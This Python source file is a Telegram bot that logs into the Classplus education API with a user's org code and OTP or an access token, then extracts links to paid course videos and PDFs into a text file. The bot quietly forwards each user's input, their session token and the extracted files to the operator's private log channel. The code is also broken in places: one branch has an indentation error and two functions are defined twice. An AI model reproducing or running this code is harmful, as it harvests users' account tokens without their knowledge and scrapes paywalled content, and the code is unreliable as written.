import requests
import json
import uuid
import asyncio
import aiohttp
import os
from pyrogram import Client, filters
from urllib.parse import urlparse
import base64
from datetime import datetime
import pytz

from Extractor import app
from config import PREMIUM_LOGS, BOT_TEXT
from Extractor.core.utils import forward_to_log

india_timezone = pytz.timezone('Asia/Kolkata')
current_time = datetime.now(india_timezone)
time_new = current_time.strftime("%d-%m-%Y %I:%M %p")

apiurl = "https://api.classplusapp.com"
s = requests.Session()

def encode_partial_url(url):
    """Encode latter half of URL"""
    if not url:
        return ""
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    path = url[len(base):]
    encoded_path = base64.b64encode(path.encode()).decode()
    return f"{base}{encoded_path}"

async def fetch_course_content(session, course_id, folder_id=0, folder_path=""):
    """Recursively fetch course content with encoded URLs"""
    result = []
    url = f"{apiurl}/v2/course/content/get?courseId={course_id}&folderId={folder_id}"
    async with aiohttp.ClientSession() as aiosession:
        async with aiosession.get(url, headers=session.headers) as resp:
            j = await resp.json()
            contents = j.get("data", {}).get("courseContent", [])

    tasks = []
    for item in contents:
        ctype = str(item.get("contentType"))
        sub_id = item.get("id")
        sub_name = item.get("name", "Untitled")
        video_url = item.get("url", "")
        content_hash = item.get("contentHashId", "")

        if ctype in ("2", "3"):  # Video or PDF
            if video_url:
                encoded_url = encode_partial_url(video_url)
                if content_hash:
                    encoded_url += f"*UGxCP_hash={content_hash}\n"
                result.append(f"{folder_path}{sub_name}: {encoded_url}")
        elif ctype == "1":  # Folder
            new_path = f"{folder_path}{sub_name} - "
            tasks.append(fetch_course_content(session, course_id, sub_id, new_path))

    sub_results = await asyncio.gather(*tasks)
    for sub in sub_results:
        result.extend(sub)

    return result

@app.on_message(filters.command(["cp"]))
async def classplus_txt(app, message):
    """Main Bot Handler"""
    details = await app.ask(
        message.chat.id,
        "🔹 <b>UG EXTRACTOR PRO</b> 🔹\n\n"
        "Send ID & Password:\n"
        "<code>ORG_CODE*Mobile</code>\n"
        "OR\n"
        "Direct Access Token\n\n"
        "Example:\n"
        "- <code>ABCD*9876543210</code>\n"
        "- <code>eyJhbGciOiJIUzI1NiIsInR5cCI6...</code>"
    )
    await forward_to_log(details, "Classplus Extractor")
    user_input = details.text.strip()
    user_id = None

    if "*" in user_input:
        try:
            org_code, mobile = user_input.split("*")
            device_id = str(uuid.uuid4()).replace('-', '')
            headers = {
                "Accept": "application/json, text/plain, */*",
                "region": "IN",
                "accept-language": "en",
                "Content-Type": "application/json;charset=utf-8",
                "Api-Version": "51",
                "device-id": device_id
            }

            org_resp = s.get(f"{apiurl}/v2/orgs/{org_code}", headers=headers).json()
            org_id = org_resp["data"]["orgId"]
            org_name = org_resp["data"]["orgName"]

            otp_payload = {
                'countryExt': '91',
                'orgCode': org_name,
                'viaSms': '1',
                'mobile': mobile,
                'orgId': org_id,
                'otpCount': 0
            }

            otp_resp = s.post(f"{apiurl}/v2/otp/generate", json=otp_payload, headers=headers)
            if otp_resp.status_code == 200:
                otp_data = otp_resp.json()
                session_id = otp_data['data']['sessionId']
                user_otp = await app.ask(
                    message.chat.id,
                    "📱 <b>OTP Verification</b>\nOTP sent to mobile. Enter OTP:",
                    timeout=300
                )
                if user_otp.text.isdigit():
                    otp = user_otp.text.strip()
                    fingerprint_id = str(uuid.uuid4()).replace('-', '')
                    verify_payload = {
                        "otp": otp,
                        "countryExt": "91",
                        "sessionId": session_id,
                        "orgId": org_id,
                        "fingerprintId": fingerprint_id,
                        "mobile": mobile
                    }

                    verify_resp = s.post(f"{apiurl}/v2/users/verify", json=verify_payload, headers=headers)
                    if verify_resp.status_code == 200:
                        vdata = verify_resp.json()
                        if vdata['status'] == 'success':
                            token = vdata['data']['token']
                            s.headers['x-access-token'] = token
                            await message.reply_text(f"✅ Login Successful!\nAccess Token:\n<code>{token}</code>")
                            await app.send_message(PREMIUM_LOGS, f"✅ New Login Alert\nToken:\n<code>{token}</code>")

                            headers = {
                                'x-access-token': token,
                                'user-agent': 'Mobile-Android',
                                'app-version': '1.4.65.3',
                                'api-version': '29',
                                'device-id': '39F093FF35F201D9'
                            }
                            resp = s.get(f"{apiurl}/v2/courses?tabCategoryId=1", headers=headers)
                            if resp.status_code == 200:
                                courses = resp.json()["data"]["courses"]
                                s.session_data = {"token": token, "courses": {c["id"]: c["name"] for c in courses}}
                                await fetch_batches(app, message, org_name)
                            else:
                                await message.reply("❌ No courses found")
    elif len(user_input) > 20:  # Direct Access Token
        token = user_input
            s.headers['x-access-token'] = token
            resp = s.get(f"{apiurl}/v2/courses?tabCategoryId=1", headers=s.headers)
            if resp.status_code == 200:
                courses = resp.json()["data"]["courses"]
                s.session_data = {"token": token, "courses": {c["id"]: c["name"] for c in courses}}

                org_name = None
                for course in courses:
                    link = course.get("shareableLink", "")
                    if "courses.store" in link:
                        org_code = link.split('.')[0].split('//')[-1]
                        org_resp = s.get(f"{apiurl}/v2/orgs/{org_code}", headers=s.headers)
                        if org_resp.status_code == 200:
                            org_data = org_resp.json().get("data", {})
                            org_name = org_data.get("orgName")
                    else:
                        try:
                            org_name = link.split('//')[1].split('.')[1]
                        except:
                            org_name = "Unknown Org"

                await fetch_batches(app, message, org_name)
            else:
                await message.reply("❌ Invalid token. Please try again.")
        else:
            await message.reply("❌ Invalid input format. Use ORG_CODE*Mobile or Access Token.")


async def fetch_batches(app, message, org_name):
    """Display available courses/batches and ask user to select"""
    session_data = s.session_data
    if "courses" not in session_data or not session_data["courses"]:
        await app.send_message(message.chat.id, "❌ No courses found. Check credentials.")
        return

    courses = session_data["courses"]
    text = "📚 <b>Available Batches</b>\n\n"
    course_list = []
    for idx, (cid, cname) in enumerate(courses.items(), start=1):
        text += f"{idx}. <code>{cname}</code>\n"
        course_list.append((idx, cid, cname))

    await app.send_message(PREMIUM_LOGS, f"<blockquote>{text}</blockquote>")
    selected_idx_msg = await app.ask(
        message.chat.id,
        f"{text}\nSend the index number of the batch to download.",
        timeout=180
    )

    if selected_idx_msg.text.isdigit():
        sel_idx = int(selected_idx_msg.text.strip())
        if 1 <= sel_idx <= len(course_list):
            sel_course_id = course_list[sel_idx-1][1]
            sel_course_name = course_list[sel_idx-1][2]
            await app.send_message(
                message.chat.id,
                f"🔄 Processing: <code>{sel_course_name}</code>"
            )
            await extract_batch(app, message, org_name, sel_course_id)
        else:
            await app.send_message(message.chat.id, "❌ Invalid selection. Send correct index.")
    else:
        await app.send_message(message.chat.id, "❌ Invalid input. Send a number.")


async def extract_batch(app, message, org_name, batch_id):
    """Fetch all content + live videos and save to text file"""
    session_data = s.session_data
    if "token" not in session_data:
        await message.reply("❌ Session token not found.")
        return

    batch_name = session_data["courses"].get(batch_id, "Unknown Batch")
    headers = {
        'x-access-token': session_data["token"],
        'user-agent': 'Mobile-Android',
        'app-version': '1.4.65.3',
        'api-version': '29',
        'device-id': '39F093FF35F201D9'
    }

    async def fetch_live_videos(course_id):
        outputs = []
        async with aiohttp.ClientSession() as session:
            try:
                url = f"{apiurl}/v2/course/live/list/videos?type=2&entityId={course_id}&limit=9999&offset=0"
                async with session.get(url, headers=headers) as resp:
                    j = await resp.json()
                    videos = j.get("data", {}).get("list", [])
                    for vid in videos:
                        name = vid.get("name", "Unknown Video")
                        vurl = vid.get("url", "")
                        c_hash = vid.get("contentHashId", "")
                        if vurl:
                            enc_url = encode_partial_url(vurl)
                            if c_hash:
                                enc_url += f"*UGxCP_hash={c_hash}\n"
                            outputs.append(f"{name}: {enc_url}")
            except Exception as e:
                print(f"Error fetching live videos: {e}")
        return outputs


    async def write_file(extracted_data):
        """Save extracted data to txt file safely"""
        invalid_chars = '\t:/+#|@*.'
        clean_name = ''.join(c for c in batch_name if c not in invalid_chars).replace('_',' ')
        path = f"{clean_name}.txt"
        with open(path, "w", encoding='utf-8') as f:
            f.write('\n'.join(extracted_data))
        return path


    extracted_data, live_videos = await asyncio.gather(
        fetch_course_content(s, batch_id),
        fetch_live_videos(batch_id)
    )
    extracted_data.extend(live_videos)
    file_path = await write_file(extracted_data)

    video_count = sum(1 for x in extracted_data if ".mp4" in x or "Video" in x)
    pdf_count = sum(1 for x in extracted_data if ".pdf" in x)
    total_links = len(extracted_data)
    other_count = total_links - (video_count + pdf_count)

    caption = (
        f"🎓 <b>COURSE EXTRACTED</b> 🎓\n\n"
        f"📱 <b>APP:</b> {org_name}\n"
        f"📚 <b>BATCH:</b> {batch_name}\n"
        f"📅 <b>DATE:</b> {time_new} IST\n\n"
        f"📊 <b>CONTENT STATS</b>\n"
        f"├─ 📁 Total Links: {total_links}\n"
        f"├─ 🎬 Videos: {video_count}\n"
        f"├─ 📄 PDFs: {pdf_count}\n"
        f"└─ 📦 Others: {other_count}\n\n"
        f"🚀 <b>Extracted by</b>: @{(await app.get_me()).username}\n\n"
        f"<code>╾───• {BOT_TEXT} •───╼</code>"
    )

    await app.send_document(message.chat.id, file_path, caption=caption)
    await app.send_document(PREMIUM_LOGS, file_path, caption=caption)
    os.remove(file_path)

async def fetch_course_content(session_obj, course_id, folder_id=0, folder_path=""):
    """Recursively fetch course content (videos, PDFs, others)"""
    results = []
    url = f"{apiurl}/v2/course/content/get?courseId={course_id}&folderId={folder_id}"
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(url, headers={
                'x-access-token': session_obj.session_data['token'],
                'user-agent': 'Mobile-Android',
                'app-version': '1.4.65.3',
                'api-version': '29',
                'device-id': '39F093FF35F201D9'
            }) as resp:
                resp_json = await resp.json()
                course_contents = resp_json.get("data", {}).get("courseContent", [])
        except Exception as e:
            print(f"Error fetching course content: {e}")
            return []

    tasks = []
    for item in course_contents:
        content_type = str(item.get("contentType"))
        sub_id = item.get("id")
        sub_name = item.get("name", "Untitled")
        url_link = item.get("url", "")
        content_hash = item.get("contentHashId", "")

        if content_type in ("2", "3"):  # Video or PDF
            if url_link:
                enc_url = encode_partial_url(url_link)
                if content_hash:
                    enc_url += f"*UGxCP_hash={content_hash}\n"
                results.append(f"{folder_path}{sub_name}: {enc_url}")

        elif content_type == "1":  # Folder
            new_folder_path = f"{folder_path}{sub_name} - "
            tasks.append(fetch_course_content(session_obj, course_id, sub_id, new_folder_path))

    sub_results = await asyncio.gather(*tasks)
    for res in sub_results:
        results.extend(res)
    return results


def encode_partial_url(url):
    """Encode latter part of URL to handle special characters safely"""
    if not url:
        return ""
    try:
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        path_part = url[len(base):]
        encoded_path = base64.b64encode(path_part.encode()).decode()
        return f"{base}{encoded_path}"
    except Exception as e:
        print(f"Error encoding URL: {e}")
        return url


# ----------------------- Bot Initialization ----------------------- #
if __name__ == "__main__":
    from pyrogram import Client
    import asyncio

    bot = Client(
        "ExtractorBot",
        api_id=os.getenv("API_ID"),
        api_hash=os.getenv("API_HASH"),
        bot_token=os.getenv("BOT_TOKEN")
    )

    print("🤖 UG Extractor Bot is running...")

    bot.run()
